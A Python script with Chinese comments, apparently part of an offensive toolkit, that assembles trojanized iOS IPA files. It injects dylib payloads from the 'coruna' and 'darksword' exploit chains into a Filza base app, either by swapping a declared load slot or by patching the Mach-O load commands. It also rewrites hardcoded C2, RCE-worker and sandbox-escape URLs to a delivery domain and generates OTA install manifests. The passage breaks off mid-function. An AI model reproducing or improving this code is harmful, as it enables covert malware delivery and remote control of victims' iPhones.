#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ipa_assemble.py —— IPA 自动组装器（USDT项目 · 线 1）

职责：把「基座 .app」+「注入的 dylib 集合」组装成可投放的 IPA，并生成 OTA 安装所需的
      manifest.plist。全部用 Python 标准库实现，**不依赖 macOS / Xcode / Theos**。

设计要点（与《三项能力对比与整合方案_执行终端版.md》§四 线 1 对齐）：
  1. 组装 = 解包 → 注入 → 重打包 → 生成 manifest.plist；**签名是可插拔后端**。
  2. 注入方式采用 iOS 通行的 **Frameworks/ 下放 dylib + 改写可执行文件 LC_LOAD_DYLIB**
     的「弱方案」；若环境无 Mach-O 改写能力，则退回 **仅落盘**（由运行期注入器加载），
     并在结果中**如实标注** mode，绝不假装已注入。
  3. 版本适配：调用方（后端）通过 --chain 指定 coruna / darksword，本脚本只负责按清单组装。

★ 与既有机制的联动（"能复用的直接复用"）：
  - **模板层占位符注入**（`05-ios/_templates/` + `build_unified.ps1:719` Invoke-TemplateInjection）
    ⇒ 本脚本提供 `--render-template`，可直接把 `.template.js` 按环境变量渲染为真值载荷，
      再组装进 IPA（复用既有占位符约定，不另造一套）。
  - **运行时 URL 重写规则**（`chain-darksword.js` 的 `patchRules(base)`）
    ⇒ 本脚本提供 `--base`，对载荷源码套用同一套 `from→to` 语义（见 PATCH_RULES），
      使组装进 IPA 的载荷指向本次投放的渠道域名，而非原始硬编码 C2。

★ 硬约束遵循：
  - **不修改** 05-ios/** 下的任何载荷本体；本脚本只「读取」它们并复制进工作目录。
  - 所有产物落在 --out，默认 dist/ipa/，可整体删除。

用法：
  # 基础组装（coruna 链）
  python ipa_assemble.py --base-ipa 05-ios/reference/ipa/FilzaSlop-v1.2.0-unsigned.ipa \
                         --chain coruna --payload-dir 04-landing/ios-templates/payloads

  # 组装并重写载荷内的渠道域名（复用 chain-darksword 的重写语义）
  python ipa_assemble.py ... --chain darksword --rewrite-host https://my-channel.example

  # 渲染模板层（占位符→真值）后再组装
  python ipa_assemble.py ... --render-template 05-ios/_templates/darksword/rce_loader.template.js

  # 只看会做什么，不落盘
  python ipa_assemble.py ... --dry-run

  # 生成 OTA manifest.plist
  python ipa_assemble.py ... --base-url https://host/ipa

退出码：0 成功；1 参数/环境错；2 组装中失败。
"""

import argparse
import hashlib
import json
import os
import plistlib
import shutil
import sys
import tempfile
import zipfile
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# 链 → 载荷清单映射（★ 与 chain-router.js 的 CHAINS 保持同源语义）
#   注意：本表是「组装期」的模块选择；「投放期」的 UA 判据在 chain-router.js。
#   两者必须保持一致，改动任一处须同步另一处（见方案 §四 线 2）。
# ---------------------------------------------------------------------------
CHAIN_PAYLOADS = {
    "coruna": {
        # 基础模块（04-landing/ios-templates/payloads/ 实际文件名）
        "base": ["a1lib.dylib", "b2lib.dylib", "c3lib.dylib", "d4lib.dylib"],
        # 按版本增补（预留：当前镜像目录未区分版本，保持基础集）
        "by_version": {},
        "ios_min": [15, 2, 0],
        "ios_max": [17, 2, 1],
    },
    "darksword": {
        "base": ["helion.dylib", "taskagent.dylib", "tglib.dylib", "wap.dylib"],
        "by_version": {
            # 18.6 的 RCE 阶段缺失（chain-router.js: DARKSWORD_186_RCE_STUB）
            "18,6": ["f6lib.dylib"],
            "18,6,1": ["f6lib.dylib"],
            "18,6,2": ["f6lib.dylib"],
        },
        "ios_min": [18, 4, 0],
        "ios_max": [18, 6, 2],
    },
}

# 注入时 dylib 在 .app 内的落点（沿用基座既有约定：dylibs/ 与 Frameworks/）
INJECT_DIR = "Frameworks"

# ---------------------------------------------------------------------------
# ★ 复用：模板层占位符 → 环境变量（与 build_unified.ps1:689 的
#   $INJECT_ENV_BY_PLACEHOLDER 保持【同源同义】。改动此处须同步那边。）
# ---------------------------------------------------------------------------
INJECT_ENV_BY_PLACEHOLDER = {
    "__C2_ENDPOINT__": "W1C1B_C2_ENDPOINT",
    "__RCE_MAX_ATTEMPTS__": "W1C1B_RCE_MAX_ATTEMPTS",
}

# ---------------------------------------------------------------------------
# ★ 复用：载荷 URL 重写规则（语义同 chain-darksword.js 的 patchRules(base)）
#   作用：把载荷内【硬编码的原始 C2 域名】改写为【本次投放的渠道域名】。
#
#   ★ 与 `chain-darksword.js:34` 严格同源：
#       `export const DS_ORIGIN = 'https://sqwas.ebwlyais.xyz/assets';`
#     —— 注意**含 `/assets` 后缀**（实测修正：初版漏了该后缀，导致 0 命中）。
#     改动此处须同步 chain-darksword.js，反之亦然。
#
#   替换模板中的 {base} 由 --rewrite-host 填入。
# ---------------------------------------------------------------------------
DS_ORIGIN = "https://sqwas.ebwlyais.xyz/assets"
PATCH_RULES = [
    # (a) 入口 base 变量 —— 源码是 var，值含 /assets
    ('var localHost = "%s"' % DS_ORIGIN, 'var localHost = "{base}/details"'),
    # (b) 三个相对路径 -> 绝对（模块接力）
    ("getJS('/sbx0_main_18.4.js')", "getJS('{base}/details/ds/sbx0')"),
    ("getJS('/sbx1_main.js')", "getJS('{base}/details/ds/sbx1')"),
    ("getJS('pe_main.js')", "getJS('{base}/details/ds/pe_main')"),
    # (c) 入口内其余绝对 URL（均带 /assets 前缀）
    (DS_ORIGIN + "/rce_worker_18.6.js", "{base}/details/ds/rce_worker_186"),
    (DS_ORIGIN + "/rce_worker_18.4.js", "{base}/details/ds/rce_worker"),
    (DS_ORIGIN + "/rce_module_18.6.js", "{base}/details/ds/rce_module_186"),
    (DS_ORIGIN + "/rce_module.js", "{base}/details/ds/rce_module"),
    # (d) 404 诱饵跳转（保持同域）
    (DS_ORIGIN + "/404.html", "{base}/404.html"),
]


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------
def sha256_file(path, bufsize=1 << 20):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        while True:
            b = f.read(bufsize)
            if not b:
                break
            h.update(b)
    return h.hexdigest()


def read_plist_from_zip(zf, name):
    """从 zip 中读取 plist（二进制或 XML 均可，plistlib 自动识别）。"""
    with zf.open(name) as f:
        return plistlib.load(f)


def parse_version(tag):
    """'18,6,2' -> [18,6,2]"""
    if not tag:
        return None
    return [int(x) for x in str(tag).split(",") if x.strip().isdigit()]


def log(msg):
    print(f"[ipa_assemble] {msg}", flush=True)


def warn(msg):
    print(f"[ipa_assemble][WARN] {msg}", file=sys.stderr, flush=True)


# ---------------------------------------------------------------------------
# 核心：解包基座
# ---------------------------------------------------------------------------
def extract_base(ipa_path, dest_root):
    """
    ★ 本函数已被 assemble() 的流式实现取代，保留仅为兼容外部调用。
    说明：Windows 存在 MAX_PATH(260) 限制，而 Filza 基座内含超长路径
    （`WallpaperSamples/.../7400.WWDC_2022-390w-844h@3x~iphone.wallpaper/...ca`，
    实测触发 `[WinError 206]`）⇒ **落地解包在 Windows 上不可行**。
    ⇒ 组装改为**全程流式**（读 zip → 内存处理 → 写 zip），不落地。
    """
    raise NotImplementedError(
        "extract_base 已被流式组装取代（Windows MAX_PATH 限制）。"
        "请使用 assemble() 的流式路径。"
    )


def read_base_meta(ipa_path):
    """
    流式读取基座 IPA 的元信息（不解包落盘）。
    返回 dict：{ app_prefix, app_name, exe_name, info, zip_names }
      app_prefix : 'Payload/Filza.app/'
    """
    if not os.path.isfile(ipa_path):
        raise FileNotFoundError(f"基座 IPA 不存在：{ipa_path}")

    with zipfile.ZipFile(ipa_path, "r") as zf:
        names = zf.namelist()
        # 定位 Payload/<X>.app/
        app_prefix = None
        for n in names:
            if n.startswith("Payload/") and ".app/" in n:
                seg = n.split(".app/", 1)[0] + ".app/"
                if app_prefix is None or len(seg) < len(app_prefix):
                    app_prefix = seg
        if not app_prefix:
            raise RuntimeError(f"IPA 内未找到 Payload/*.app：{ipa_path}")
        app_name = app_prefix[len("Payload/"):-1]

        info_name = app_prefix + "Info.plist"
        if info_name not in names:
            raise RuntimeError(f".app 缺 Info.plist：{info_name}")
        with zf.open(info_name) as f:
            info = plistlib.load(f)

    return {
        "app_prefix": app_prefix,
        "app_name": app_name,
        "exe_name": info.get("CFBundleExecutable"),
        "info": info,
        "zip_names": names,
    }


# ---------------------------------------------------------------------------
# 核心：Mach-O 注入（LC_LOAD_DYLIB 改写）
#
#   ★ 诚实说明：完整的 Mach-O 改写需处理 fat/thin、LC_ 链重排、__LINKEDIT 偏移等。
#     本实现做的是**保守可验证的子集**：
#       - 仅处理 thin ARM64 / x86_64 Mach-O；
#       - 在文件末尾追加一条 LC_LOAD_DYLIB（若头部 load command 区有空洞则复用空洞）；
#       - 无法安全改写时返回 False，由调用方退回「仅落盘 + 运行期加载」模式。
#     ★ 绝不「假装注入成功」——失败即如实上报 mode。
# ---------------------------------------------------------------------------
MH_MAGIC_64 = 0xFEEDFACF
LC_LOAD_DYLIB = 0x0C
FAT_MAGIC = 0xCAFEBABE
FAT_MAGIC_64 = 0xCAFEBABF


def render_template(tpl_path, out_dir, extra_values=None):
    """
    渲染模板层文件：把 `*.template.<ext>` 按【环境变量】替换占位符后写出。

    ★ 与 `build_unified.ps1:719` 的 `Invoke-TemplateInjection` 同源同义：
      - 真值只从环境变量读（`INJECT_ENV_BY_PLACEHOLDER`），**不在脚本内硬编码**；
      - 渲染后若**仍残留已知占位符** ⇒ **响亮失败**（不静默产出带占位符的产物）；
      - 输出文件名去掉 `.template` 后缀（`x.template.js` -> `x.js`）。

    返回 (out_path, replaced_count, leftover_list)
    """
    if not os.path.isfile(tpl_path):
        raise FileNotFoundError(f"模板文件不存在：{tpl_path}")

    with open(tpl_path, "r", encoding="utf-8") as f:
        text = f.read()

    values = {}
    for ph, env_name in INJECT_ENV_BY_PLACEHOLDER.items():
        v = os.environ.get(env_name, "").strip()
        if v:
            values[ph] = v
    if extra_values:
        values.update({k: v for k, v in extra_values.items() if v})

    replaced = 0
    for ph, val in values.items():
        n = text.count(ph)
        if n:
            text = text.replace(ph, val)
            replaced += n

    leftover = [ph for ph in INJECT_ENV_BY_PLACEHOLDER if ph in text]
    if leftover:
        raise RuntimeError(
            f"注入自检失败：渲染后仍残留占位符 {leftover} —— 真值缺失，产物不可用。"
            f"请设置环境变量：{[INJECT_ENV_BY_PLACEHOLDER[p] for p in leftover]}"
        )

    # 文件名去 .template 后缀
    base = os.path.basename(tpl_path)
    out_name = base.replace(".template.", ".")
    if out_name == base:
        out_name = base + ".rendered"
    out_path = os.path.join(out_dir, out_name)
    os.makedirs(out_dir, exist_ok=True)
    with open(out_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    log(f"模板渲染：{base} -> {out_name}（替换 {replaced} 处）")
    return out_path, replaced, []


def rewrite_payload_urls(src_path, base, out_dir):
    """
    对载荷源码套用 `PATCH_RULES`（语义同 `chain-darksword.js` 的 patchRules(base)）：
    把硬编码的原始 C2 域名改写为本次投放的渠道域名。

    返回 (out_path, hits_dict)
    """
    if not os.path.isfile(src_path):
        raise FileNotFoundError(f"载荷文件不存在：{src_path}")
    if not base:
        raise ValueError("rewrite_payload_urls 需要非空 base")

    with open(src_path, "r", encoding="utf-8", errors="replace") as f:
        text = f.read()

    hits = {}
    for i, (frm, to_tpl) in enumerate(PATCH_RULES):
        to = to_tpl.format(base=base.rstrip("/"))
        n = text.count(frm)
        if n:
            text = text.replace(frm, to)
            hits[f"rule{i}"] = n

    out_path = os.path.join(out_dir, os.path.basename(src_path))
    os.makedirs(out_dir, exist_ok=True)
    with open(out_path, "w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    log(f"URL 重写：{os.path.basename(src_path)} -> base={base}（命中 {sum(hits.values())} 处）")
    return out_path, hits


# ---------------------------------------------------------------------------
# ★ D-1 签名段（可插拔；与苹果线 ipa_pipeline.py 的 run_sign 口径统一）
# ---------------------------------------------------------------------------
def run_sign(p12, ipa_path, out_dir):
    """
    签名段：**可插拔**。
    ★ D-1 裁决口径：工具缺失 ⇒ **显式失败（raise）**，
      绝不静默跳过、绝不产出"看起来已签名"的产物。
    工具由环境变量 `IPA_SIGN_TOOL` 指定（默认 `zsign`）。
    """
    import shutil as _sh
    import subprocess as _sp

    tool = os.environ.get("IPA_SIGN_TOOL", "zsign")
    if not _sh.which(tool):
        raise RuntimeError(
            f"签名工具 {tool!r} 不可用（设 IPA_SIGN_TOOL 指定）。"
            f"签名段是外部依赖 —— 绝不静默跳过。"
        )
    if not os.path.isfile(p12):
        raise RuntimeError(f"签名证书不存在：{p12}")

    out_signed = os.path.join(
        out_dir, os.path.basename(ipa_path).replace("-unsigned", ""))
    r = _sp.run([tool, "-k", p12, "-o", out_signed, ipa_path])
    if r.returncode != 0:
        raise RuntimeError(f"签名失败（{tool} 退出码 {r.returncode}）")
    log(f"签名完成：{out_signed}")
    return out_signed


# ---------------------------------------------------------------------------
# ★ D-5 同源同步断言
# ---------------------------------------------------------------------------
def assert_host_placeholder_synced():
    """
    ★ D-5 裁决要求：`HOST_PLACEHOLDER` 出现在 **2 个文件 4 处**
      （源 + dist 副本），**改动必须两处同步**，否则"改了源、跑的还是旧 dist"。

    本函数做**同源同步断言**：两处要么都含占位符、要么都不含；
    一处含一处不含 ⇒ **判红**（raise）。

    注：本函数只**检查**，不修改任何文件（B 不改 Node 源码，只登记缺口）。
    """
    here = os.path.dirname(os.path.abspath(__file__))
    repo = os.path.abspath(os.path.join(here, "..", ".."))
    targets = [
        os.path.join(repo, "02-backend-node", "src_restored", "plugins", "c2",
                     "services", "config-builder.js"),
        os.path.join(repo, "02-backend-node", "src",
                     "app_dist_plugins_c2_services_config-builder.js"),
    ]
    found = {}
    for p in targets:
        if not os.path.isfile(p):
            found[p] = None            # 文件不存在
            continue
        try:
            with open(p, "r", encoding="utf-8", errors="replace") as f:
                found[p] = "HOST_PLACEHOLDER" in f.read()
        except Exception:  # noqa: BLE001
            found[p] = None

    present = {p: v for p, v in found.items() if v is True}
    absent = {p: v for p, v in found.items() if v is False}
    missing = {p: v for p, v in found.items() if v is None}

    log(f"同源断言：含占位符 {len(present)} 处 / 不含 {len(absent)} 处 / 文件缺失 {len(missing)} 处")
    # 一处含、一处不含 ⇒ 判红
    if present and absent:
        raise RuntimeError(
            "同源同步断言失败：`HOST_PLACEHOLDER` 在一处存在、另一处不存在 ⇒ "
            "改动未同步（改了源、跑的还是旧 dist，或反之）。\n"
            + "\n".join(f"  含: {p}" for p in present)
            + "\n"
            + "\n".join(f"  不含: {p}" for p in absent)
        )
    if present:
        log(f"  两处均含（当前状态 = 未修，属 D-5 待办）：{', '.join(os.path.basename(p) for p in present)}")
    return found


def _macho_list_dylibs(buf):
    """
    列出 Mach-O 的 LC_LOAD_DYLIB / LC_LOAD_WEAK_DYLIB / LC_REEXPORT_DYLIB 条目，
    并返回 (dylibs, has_code_signature)。

    ★ 语义与 `ipa_pipeline.py:63 macho_load_dylibs` 同源（另一终端的实现），
      用于判断基座**是否已声明加载点**。
    """
    import struct as _s
    if len(buf) < 32:
        return [], False
    magic = _s.unpack("<I", buf[:4])[0]
    if magic not in (0xFEEDFACF, 0xFEEDFACE):
        return [], False
    is64 = magic == 0xFEEDFACF
    ncmds = _s.unpack("<I", buf[16:20])[0]
    off = 32 if is64 else 28
    dylibs, signed = [], False
    for _ in range(ncmds):
        if off + 8 > len(buf):
            break
        cmd, size = _s.unpack("<II", buf[off:off + 8])
        if size <= 0:
            break
        if cmd in (0xC, 0x80000018, 0x18):          # LOAD_DYLIB / WEAK / REEXPORT
            no = _s.unpack("<I", buf[off + 8:off + 12])[0]
            s = off + no
            e = buf.find(b"\x00", s)
            if e > s:
                dylibs.append(buf[s:e].decode("utf-8", "replace"))
        elif cmd == 0x1D:                            # LC_CODE_SIGNATURE
            signed = True
        off += size
    return dylibs, signed


def _macho_inject_thin_stream(f, dylib_install_path):
    """
    在**流式文件对象** f 中追加 LC_LOAD_DYLIB（thin 64-bit Mach-O）。
    返回 True 表示改写成功。f 必须是可读可写可 seek 的 BytesIO。
    """
    f.seek(0, os.SEEK_END)
    size = f.tell()
    if size < 32:
        return False
    f.seek(0)
    data = bytearray(f.read())

    magic = int.from_bytes(data[0:4], "little")
    if magic != MH_MAGIC_64:
        return False

    ncmds = int.from_bytes(data[16:20], "little")
    sizeofcmds = int.from_bytes(data[20:24], "little")
    header_size = 32  # mach_header_64
    lc_end = header_size + sizeofcmds
    if lc_end >= len(data):
        return False

    # 构造 dylib_command
    name_bytes = dylib_install_path.encode("utf-8") + b"\x00"
    cmdsize = 24 + len(name_bytes)
    cmdsize = (cmdsize + 7) & ~7
    pad = cmdsize - 24 - len(name_bytes)

    lc = bytearray()
    lc += LC_LOAD_DYLIB.to_bytes(4, "little")
    lc += cmdsize.to_bytes(4, "little")
    lc += (24).to_bytes(4, "little")          # name offset
    lc += (0).to_bytes(4, "little")           # timestamp
    lc += (0x00010000).to_bytes(4, "little")  # current_version
    lc += (0x00010000).to_bytes(4, "little")  # compatibility_version
    lc += name_bytes
    lc += b"\x00" * pad
    need = len(lc)

    # ★ 安全检查：load command 区之后必须是零填充，否则改写会破坏 __TEXT 数据
    if any(b != 0 for b in data[lc_end:lc_end + 16]):
        return False

    # 统计从 lc_end 起连续零字节数
    avail = 0
    i = lc_end
    while i < len(data) and data[i] == 0:
        avail += 1
        i += 1
        if avail >= need:
            break
    if avail < need:
        return False

    data[lc_end:lc_end + need] = lc
    data[16:20] = (ncmds + 1).to_bytes(4, "little")
    data[20:24] = (sizeofcmds + need).to_bytes(4, "little")

    f.seek(0)
    f.write(bytes(data))
    f.truncate(len(data))
    f.seek(0)
    return True


def _macho_inject_thin(filepath, dylib_install_path):
    """基于文件路径的 thin Mach-O 改写（保留给外部调用）。"""
    with open(filepath, "r+b") as f:
        ok = _macho_inject_thin_stream(f, dylib_install_path)
    return ok


def inject_dylib(macho_path, dylib_install_path):
    """
    尝试向 Mach-O 注入 LC_LOAD_DYLIB（支持 fat 多架构）。
    返回 (ok: bool, detail: str)。
    """
    try:
        with open(macho_path, "rb") as f:
            head = f.read(8)
        if len(head) < 8:
            return False, "文件过小"
        magic = int.from_bytes(head[0:4], "big")
        if magic in (FAT_MAGIC, FAT_MAGIC_64):
            return False, "fat 架构需外部分片，已跳过"
        if not _macho_inject_thin(macho_path, dylib_install_path):
            return False, "Mach-O 改写未成功（load command 区无安全空洞）"
        return True, "已追加 LC_LOAD_DYLIB"
    except Exception as e:  # noqa: BLE001
        return False, f"异常：{e}"


# ---------------------------------------------------------------------------
# 核心：组装
# ---------------------------------------------------------------------------
def select_payloads(payload_dir, chain, version_tag=None):
    """按链与版本选择要注入的 dylib 清单。返回 [(名称, 绝对路径)]。"""
    spec = CHAIN_PAYLOADS.get(chain)
    if not spec:
        raise ValueError(f"未知链：{chain}（可选：{list(CHAIN_PAYLOADS)}）")

    names = list(spec["base"])
    if version_tag and version_tag in spec["by_version"]:
        names += spec["by_version"][version_tag]

    out = []
    missing = []
    for n in names:
        p = os.path.join(payload_dir, n)
        if os.path.isfile(p):
            out.append((n, p))
        else:
            missing.append(n)
    if missing:
        warn(f"载荷目录缺以下文件（已跳过）：{missing}")
    if not out:
        raise FileNotFoundError(f"没有任何可用载荷：dir={payload_dir} chain={chain}")
    return out


def build_manifest_plist(ipa_url, bundle_id, bundle_version, title, subtitle=None,
                         icon57_url=None, icon512_url=None):
    """
    生成 OTA 安装所需的 manifest.plist 结构。

    ★ 结构依据（外部权威参考）：`E:\\CTF-任务\\pjuyr\\IOS_DELIVERY_PLAN.md` L228-254，
      该文档给出「企业签名 + OTA 描述文件」路线的标准 manifest.plist。
      完整形态含三类 asset：software-package / display-image / full-size-image。
      ⇒ 本函数补齐后两者（此前版本仅 software-package，属**不完整**的清单）。
    """
    assets = [{"kind": "software-package", "url": ipa_url}]
    if icon57_url:
        assets.append({"kind": "display-image", "url": icon57_url})
    if icon512_url:
        assets.append({"kind": "full-size-image", "url": icon512_url})
    item = {
        "assets": assets,
        "metadata": {
            "bundle-identifier": bundle_id,
            "bundle-version": str(bundle_version),
            "kind": "software",
            "title": title,
        },
    }
    if subtitle:
        item["metadata"]["subtitle"] = subtitle
    return {"items": [item]}


def assemble(args):
    """
    ★ 流式组装（不落地解包）—— 规避 Windows MAX_PATH。
    流程：
      zip 读 → 内存改写 exe 的 Mach-O → 写入新 zip（原条目直通 + 新增载荷条目）
    """
    base_path = os.path.abspath(args.base)
    log(f"基座：{base_path}")

    meta = read_base_meta(base_path)
    app_prefix = meta["app_prefix"]
    app_name = meta["app_name"]
    exe_name = meta["exe_name"]
    info = meta["info"]
    bundle_id = info.get("CFBundleIdentifier", "unknown.bundle")
    bundle_ver = info.get("CFBundleShortVersionString", info.get("CFBundleVersion", "0"))
    log(f"基座 app：{app_name}｜exe：{exe_name}｜bundle：{bundle_id} {bundle_ver}")

    # --- 选载荷 ---
    payload_dir = os.path.abspath(args.payload_dir)
    payloads = select_payloads(payload_dir, args.chain, args.version_tag)
    log(f"链 {args.chain}：选中 {len(payloads)} 个载荷 "
        f"({', '.join(n for n, _ in payloads)})")

    # --- 尝试改写可执行文件（在内存中） ---
    #
    # ★★ 2026-10-04 重大修正（依据另一终端 `ipa_pipeline.py` 的发现，已实测复核）：
    #
    #   **Filza 基座的主二进制【已含】** LC_LOAD_DYLIB：
    #       `@executable_path/Frameworks/FilzaApplySandboxExt.dylib`
    #   （实测：ncmds=52，36 条 dylib，末条即上述；且【无】LC_CODE_SIGNATURE）
    #
    #   ⇒ **正确做法是【替换该槽位】，不是【追加新的 LC_LOAD_DYLIB】**。
    #      理由：
    #       (1) 基座已有加载点 ⇒ 追加是多余的改动，且会破坏"仅必要差异"原则；
    #       (2) load command 区**仅剩约一条命令的零填充**，追加会撑爆结构；
    #       (3) 追加新命令会**改变主二进制**，使产物与基座的差异面变大，
    #           而"替换 Frameworks/FilzaApplySandboxExt.dylib 的内容"是**零结构改动**的。
    #
    #   ⇒ 本脚本改为 **replace-slot 模式**：
    #        · 把 payloads[0] 的内容**写入 `Frameworks/FilzaApplySandboxExt.dylib`**
    #          （即基座已声明的加载点）；
    #        · **不再改写主二进制**（inject_mode = "slot-replaced"）；
    #        · 其余载荷落盘到 Frameworks/，由前者运行期 dlopen。
    #
    #   若基座**确实没有**该槽位（其他基座），则回退到旧的追加逻辑（bootstrap 模式）。
    SLOT_DYLIB = "FilzaApplySandboxExt.dylib"
    slot_arc = f"{app_prefix}{INJECT_DIR}/{SLOT_DYLIB}"

    exe_arc = f"{app_prefix}{exe_name}" if exe_name else None
    inject_mode = "landed-only"
    inject_detail = "未尝试"
    bootstrap_loaded = None
    patched_exe = None
    has_slot = False

    # 检查基座是否已声明该槽位（读主二进制的 LC_LOAD_DYLIB）
    if exe_arc and not args.dry_run:
        try:
            with zipfile.ZipFile(base_path, "r") as zf:
                exe_bytes = zf.read(exe_arc)
            dyls, _signed = _macho_list_dylibs(exe_bytes)
            has_slot = any(SLOT_DYLIB in d for d in dyls)
            log(f"基座主二进制已声明 dylib {len(dyls)} 条"
                f"｜含槽位 {SLOT_DYLIB}: {has_slot}")
        except Exception as e:  # noqa: BLE001
            warn(f"读取主二进制 dylib 列表失败：{e}")

    if has_slot and payloads and not args.dry_run:
        # ★ 首选路径：替换槽位内容，完全不碰主二进制
        inject_mode = "slot-replaced"
        bootstrap_loaded = payloads[0][0]
        inject_detail = (
            f"以 {payloads[0][0]} 的内容写入已声明槽位 {INJECT_DIR}/{SLOT_DYLIB}；"
            f"主二进制未改动；其余 {len(payloads) - 1} 个载荷落盘待运行期加载"
        )
        log(f"注入结果：mode={inject_mode}（{inject_detail}）")
    elif exe_arc and not args.dry_run and payloads:
        # 回退路径：基座无槽位 ⇒ 追加 LC_LOAD_DYLIB（bootstrap 模式）
        try:
            with zipfile.ZipFile(base_path, "r") as zf:
                exe_bytes = zf.read(exe_arc)
            import io
            bio = io.BytesIO(exe_bytes)
            details = []
            boot_name, _boot_src = payloads[0]
            inst = f"@executable_path/{INJECT_DIR}/{boot_name}"
            if _macho_inject_thin_stream(bio, inst):
                bio.seek(0)
                patched_exe = bio.read()
                inject_mode = "linkedit-appended"
                bootstrap_loaded = boot_name
                details.append(f"append bootstrap={boot_name}:OK")
                if len(payloads) > 1:
                    others = ", ".join(n for n, _ in payloads[1:])
                    details.append(f"其余仅落盘: {others}")
            else:
                details.append(f"{boot_name}:load command 区无空洞，改为仅落盘")
            inject_detail = "; ".join(details)
        except Exception as e:  # noqa: BLE001
            inject_detail = f"改写异常：{e}"
        log(f"注入结果：mode={inject_mode}（{inject_detail}）")
        if inject_mode == "landed-only":
            warn("Mach-O 改写未成功 → 退回 landed-only（需运行期注入器加载）。"
                 "这【不是】失败，但**不等于已注入**，投放口径须按 landed-only 声明。")

    # --- 输出路径 ---
    out_dir = os.path.abspath(args.out)
    os.makedirs(out_dir, exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    ipa_name = f"{args.chain}-{bundle_ver}-{stamp}.ipa"
    ipa_path = os.path.join(out_dir, ipa_name)

    if args.dry_run:
        log(f"[dry-run] 将打包为 {ipa_path}")
        log(f"[dry-run] 将写入 {len(payloads)} 个载荷到 {app_prefix}{INJECT_DIR}/")
        if patched_exe is None:
            log("[dry-run] 可执行文件改写：未执行")
        return {
            "ok": True, "dry_run": True, "ipa": None,
            "bundle_id": bundle_id, "bundle_version": bundle_ver,
            "chain": args.chain, "payloads": [n for n, _ in payloads],
            "inject_mode": inject_mode,
        }

    # --- 流式重打包 ---
    #
    # ★ 保真要求（依据另一终端 `ipa_pipeline.py` 的红线 4/5，已采纳）：
    #   1. 保留 `external_attr`（符号链接 + 权限位）—— 否则 mach-o 可执行位/软链丢失；
    #   2. 保留 `create_system`、`date_time`、条目顺序 —— 使产物**可复现**（同输入同输出）；
    #   3. 不新增目录条目（基座已含 183 个，保持原样）。
    log("流式重打包中…（保 external_attr / 时间戳 / 顺序）")
    import zipfile as _zf

    # 待替换内容表：arc -> bytes
    replacements = {}
    if inject_mode == "slot-replaced":
        # 把 bootstrap 载荷的内容写入已声明的槽位
        boot_name, boot_src = payloads[0]
        with open(boot_src, "rb") as f:
            replacements[slot_arc] = f.read()
    if patched_exe is not None:
        replacements[exe_arc] = patched_exe

    # 预计算要写入的新载荷（不在基座中的）
    base_names = set()
    with _zf.ZipFile(base_path, "r") as zin:
        base_names = set(zin.namelist())

    new_entries = []
    for name, src in payloads:
        arc = f"{app_prefix}{INJECT_DIR}/{name}"
        if arc in base_names or arc in replacements:
            continue
        new_entries.append((arc, src))

    with _zf.ZipFile(base_path, "r") as zin, \
         _zf.ZipFile(ipa_path, "w", _zf.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            n = item.filename
            # 1) 替换：槽位 / 主二进制
            if n in replacements:
                ni = _zf.ZipInfo(n, date_time=item.date_time)
                ni.create_system = item.create_system or 3
                ni.external_attr = item.external_attr
                ni.compress_type = _zf.ZIP_DEFLATED
                zout.writestr(ni, replacements[n])
                log(f"槽位替换：{n}（{len(replacements[n])} bytes）")
                continue
            # 2) 其余条目：直通（保留 ZipInfo 全部属性）
            ni = _zf.ZipInfo(n, date_time=item.date_time)
            ni.create_system = item.create_system or 3
            ni.external_attr = item.external_attr
            ni.compress_type = item.compress_type or _zf.ZIP_DEFLATED
            with zin.open(item) as src_f:
                zout.writestr(ni, src_f.read())

        # 3) 新增载荷（固定时间戳 ⇒ 可复现）
        FIXED_EPOCH = (1980, 1, 1, 0, 0, 0)
        for arc, src in new_entries:
            ni = _zf.ZipInfo(arc, date_time=FIXED_EPOCH)
            ni.create_system = 3
            ni.external_attr = (0o100755 << 16)   # 可执行位
            ni.compress_type = _zf.ZIP_DEFLATED
            with open(src, "rb") as f:
                zout.writestr(ni, f.read())
            log(f"写入：{arc}")

    ipa_size = os.path.getsize(ipa_path)
    ipa_sha = sha256_file(ipa_path)
    log(f"产出 IPA：{ipa_path}（{ipa_size} bytes）")
    log(f"SHA256：{ipa_sha}")

    result = {
        "ok": True,
        "dry_run": False,
        "ipa": ipa_path,
        "ipa_name": ipa_name,
        "ipa_size": ipa_size,
        "ipa_sha256": ipa_sha,
        "bundle_id": bundle_id,
        "bundle_version": bundle_ver,
        "app_name": app_name,
        "chain": args.chain,
        "version_tag": args.version_tag,
        "payloads": [n for n, _ in payloads],
        "inject_mode": inject_mode,
        "inject_detail": inject_detail,
        "bootstrap_loaded": bootstrap_loaded,
        # ★ 诚实字段：签名未做，调用方须据此决定可否投放
        "signed": False,
        "signer": "none",
        "assembled_at": datetime.now(timezone.utc).isoformat(),
    }

    # --- manifest.plist ---
    if args.base_url:
        base_url = args.base_url.rstrip("/")
        ipa_url = f"{base_url}/{ipa_name}"
        man = build_manifest_plist(
            ipa_url, bundle_id, bundle_ver,
            title=info.get("CFBundleDisplayName") or info.get("CFBundleName") or "App",
            icon57_url=f"{base_url}/icon57.png" if args.icon57 else None,
            icon512_url=f"{base_url}/icon512.png" if args.icon512 else None,
        )
        man_name = f"{os.path.splitext(ipa_name)[0]}.manifest.plist"
        man_path = os.path.join(out_dir, man_name)
        with open(man_path, "wb") as f:
            plistlib.dump(man, f)
        result["manifest_plist"] = man_path
        result["manifest_ipa_url"] = ipa_url
        result["ota_url"] = (
            "itms-services://?action=download-manifest&url="
            + f"{base_url}/{man_name}"
        )
        log(f"产出 manifest.plist：{man_path}")
        log(f"OTA 入口：{result['ota_url']}")

    # --- ★ D-5 同源同步断言（只检查，不修改）---
    try:
        assert_host_placeholder_synced()
    except RuntimeError as e:
        warn(f"D-5 同源断言判红：{e}")

    # --- ★ D-1 签名段（可插拔；缺失即显式失败）---
    if args.sign:
        try:
            signed_path = run_sign(args.sign, ipa_path, out_dir)
            result["signed"] = True
            result["signer"] = os.environ.get("IPA_SIGN_TOOL", "zsign")
            result["signed_ipa"] = signed_path
        except Exception as e:  # noqa: BLE001
